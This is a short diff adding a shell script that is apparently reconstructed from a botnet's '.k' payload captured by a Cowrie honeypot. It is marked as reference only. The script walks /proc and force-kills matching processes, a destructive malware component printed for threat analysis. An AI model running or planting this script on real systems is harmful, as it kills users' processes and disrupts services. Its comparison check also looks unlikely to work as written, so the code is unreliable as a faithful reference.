@@ -1,0 +1,13 @@
+# The ".k" script, decoded from the hex the bots wrote with `busybox echo -ne`.
+# Rebuilt from 31.171.66.62, where Cowrie logged the full script text.
+# Reference only. Do not run it: it force-kills processes.
+
+#!/bin/sh
+for proc_dir in /proc/*; do
+    pid=${proc_dir##*/}
+    result=$(ls -l "/proc/$pid/exe" 2> /dev/null)
+    if [ "$result" == "/proc/$pid/exe" ]
+    then
+        kill -9 "$pid"
+    fi
+done
